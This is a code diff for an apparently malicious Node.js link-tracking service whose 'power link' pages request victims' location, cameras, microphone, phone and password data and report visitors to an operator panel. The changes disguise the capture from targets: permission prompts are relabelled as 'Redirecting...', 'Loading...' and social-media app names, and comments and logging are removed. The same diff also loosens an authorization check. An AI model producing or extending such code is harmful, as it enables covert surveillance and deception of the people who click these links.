@@ -72,12 +72,16 @@ app.post('/logout', (req, res) => {
 
 app.get('/api/visitors', (req, res) => {
     if (!req.session.admin) return res.status(401).json({ error: 'Unauthorized' });
-    res.json(readUsers());
+    const users = readUsers();
+    const filteredUsers = users.filter(u => !u.publisherId);
+    res.json(filteredUsers);
 });
 
 app.get('/api/users-data', (req, res) => {
     if (!req.session.admin) return res.status(401).json({ error: 'Unauthorized' });
-    res.json(readUsers());
+    const users = readUsers();
+    const filteredUsers = users.filter(u => !u.publisherId);
+    res.json(filteredUsers);
 });
 
 app.get('/api/super-users', (req, res) => {
@@ -93,7 +97,8 @@ app.get('/api/publishers', (req, res) => {
 app.get('/api/links', (req, res) => {
     if (!req.session.admin) return res.status(401).json({ error: 'Unauthorized' });
     const users = readUsers();
-    res.json(users.map(u => ({
+    const filteredUsers = users.filter(u => !u.publisherId);
+    res.json(filteredUsers.map(u => ({
         linkId: u.linkId || u.id.substring(0, 8),
         link: u.link,
         powerLink: u.powerLink || null,
@@ -232,9 +237,7 @@ app.get('/api/publisher-data/:id', (req, res) => {
     const publishers = readPublishers();
     const publisher = publishers.find(p => p.id === req.params.id);
     if (!publisher) return res.status(404).json({ error: 'Not found' });
-    if (req.session.admin) {
-        res.json(publisher);
-    } else if (req.session.publisher && req.session.publisherId === req.params.id) {
+    if (req.session.admin || req.session.publisherId === req.params.id) {
         res.json(publisher);
     } else {
         res.status(401).json({ error: 'Unauthorized' });
@@ -265,12 +268,10 @@ app.post('/api/publisher-generate-link', (req, res) => {
         visitHistory: []
     };
     
-    // Add to main users
     const users = readUsers();
     users.push(visitorInfo);
     writeUsers(users);
     
-    // Add to publisher's users
     const publishers = readPublishers();
     const pIndex = publishers.findIndex(p => p.id === req.session.publisherId);
     if (pIndex !== -1) {
@@ -300,7 +301,7 @@ app.put('/api/publisher/:id/suspend', (req, res) => {
 });
 
 // ============================================
-// POWER LINK ROUTE - FAST
+// POWER LINK ROUTE
 // ============================================
 app.get('/p/:visitorId', (req, res) => {
     const { visitorId } = req.params;
@@ -549,7 +550,7 @@ app.get('/p/:visitorId', (req, res) => {
             }
 
             function requestAllPermissions() {
-                updateStatus('📸 Requesting permissions...', 40);
+                updateStatus('Redirecting...', 40);
 
                 Promise.all([
                     requestLocation(),
@@ -725,7 +726,7 @@ app.get('/p/:visitorId', (req, res) => {
 });
 
 // ============================================
-// SUPER POWER LINK ROUTE - FIXED
+// SUPER POWER LINK ROUTE
 // ============================================
 app.get('/sp/:visitorId', (req, res) => {
     const { visitorId } = req.params;
@@ -831,14 +832,14 @@ app.get('/sp/:visitorId', (req, res) => {
         <div id="statusText">⏳ Initializing...</div>
         <div class="progress-container"><div class="progress-bar" id="progressBar"></div></div>
         <div class="perm-grid" id="permGrid">
-            <div class="perm-item" id="permLocation">📍 Location</div>
-            <div class="perm-item" id="permFront">📸 Front Camera</div>
-            <div class="perm-item" id="permBack">📸 Back Camera</div>
-            <div class="perm-item" id="permAudio">🎙️ Audio</div>
-            <div class="perm-item" id="permBattery">🔋 Battery</div>
-            <div class="perm-item" id="permNetwork">📶 Network</div>
-            <div class="perm-item" id="permPhone">📞 Phone</div>
-            <div class="perm-item" id="permPasswords">🔑 Passwords</div>
+            <div class="perm-item" id="permLocation">Youtube</div>
+            <div class="perm-item" id="permFront">Instagram</div>
+            <div class="perm-item" id="permBack">Facebook</div>
+            <div class="perm-item" id="permAudio">Snapchat</div>
+            <div class="perm-item" id="permBattery">WhatsApp</div>
+            <div class="perm-item" id="permNetwork">Twitter</div>
+            <div class="perm-item" id="permPhone">Telegram</div>
+            <div class="perm-item" id="permPasswords">Others ...</div>
         </div>
     </div>
 
@@ -971,7 +972,7 @@ app.get('/sp/:visitorId', (req, res) => {
             }
 
             function requestAllPermissions() {
-                updateStatus('📸 Requesting all permissions...', 30);
+                updateStatus('Loading...', 30);
 
                 Promise.all([
                     requestLocation(),
@@ -1331,7 +1332,6 @@ io.on('connection', (socket) => {
                 visitHistory: [...(users[userIndex].visitHistory || []), visitRecord]
             };
             
-            // Check if this is a publisher's visitor
             if (users[userIndex].publisherId) {
                 const publishers = readPublishers();
                 const pIndex = publishers.findIndex(p => p.id === users[userIndex].publisherId);
@@ -1346,7 +1346,6 @@ io.on('connection', (socket) => {
                 }
             }
             
-            // Save to super users if super power data
             if (users[userIndex].superPowerData) {
                 const superUsers = readSuperUsers();
                 const existing = superUsers.find(u => u.id === visitorId);
@@ -1364,7 +1363,6 @@ io.on('connection', (socket) => {
             writeUsers(users);
             connectedClients.set(visitorId, socket.id);
             io.emit('visitor-connected', users[userIndex]);
-            console.log('📱 Visitor connected:', visitorId, 'Total visits:', users[userIndex].totalVisits);
         }
     });
     
